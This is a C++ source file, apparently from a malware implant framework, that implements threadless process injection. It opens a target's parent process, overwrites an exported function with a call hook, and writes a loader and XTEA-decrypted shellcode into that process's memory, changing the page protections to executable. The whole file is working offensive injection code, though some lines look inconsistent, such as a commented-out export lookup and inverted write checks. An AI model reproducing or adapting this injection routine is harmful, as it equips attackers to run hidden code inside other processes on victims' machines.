#include <core/include/inject.hpp>
#define CALL_X_OFFSET 0x1
#define EXPORT_OFFSET 0x12

using namespace Hash;
using namespace Xtea;
using namespace Modules;
using namespace Process;
using namespace Memory::Methods;
using namespace Utils::Scanners;
using namespace Utils;

namespace Injection {

    VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total) {
        HEXANE;

        HANDLE process      = { };
        UINT_PTR loader_rva = 0;
        UINT_PTR ex_addr    = 0;
        UINT_PTR ex_addr_p  = 0;
        UINT_PTR hook_p     = 0;
        UINT_PTR hook       = 0;
        SIZE_T write        = 0;

        //x_assert(ex_addr    = GetExportAddress(LoadModule(writer.target_module), writer.target_export));
        x_assert(process    = OpenParentProcess(writer.target_process));
        x_assert(hook       = RelocateExport(process, C_PTR(ex_addr), n_shellcode));

        hook_p      = hook;
        loader_rva  = hook - (ex_addr + 5);

        MemCopy(&ex_addr_p, &ex_addr, sizeof(void*));
        MemCopy(B_PTR(writer.loader)+EXPORT_OFFSET, &ex_addr_p, sizeof(void*));
        MemCopy(B_PTR(writer.opcode)+CALL_X_OFFSET, &loader_rva, 4);

        x_ntassert(ctx->win32.NtProtectVirtualMemory(process, (void**) &ex_addr_p, &total, PAGE_EXECUTE_READWRITE, nullptr));
        x_ntassert(ctx->win32.NtWriteVirtualMemory(process, C_PTR(ex_addr), (void*) writer.opcode->address, 0x5, &write));
        x_assert(write != 0x5);

        x_ntassert(ctx->win32.NtProtectVirtualMemory(process, (void**) &hook_p, &total, PAGE_READWRITE, nullptr));
        x_ntassert(ctx->win32.NtWriteVirtualMemory(process, C_PTR(hook), writer.loader->address, writer.loader->size, &write));
        x_assert(write != writer.loader->size);

        if (ENCRYPTED) {
            XteaCrypt(B_PTR(shellcode), n_shellcode, ctx->config.session_key, FALSE);
        }

        x_ntassert(ctx->win32.NtWriteVirtualMemory(process, RVA(PBYTE, hook, writer.loader->size), shellcode, n_shellcode, &write));
        x_assert(write != n_shellcode);

        x_ntassert(ctx->win32.NtProtectVirtualMemory(process, (void**) &hook, &n_shellcode, PAGE_EXECUTE_READ, nullptr));

        defer:
        if (process) {
            ctx->win32.NtClose(process);
        }
    }
}
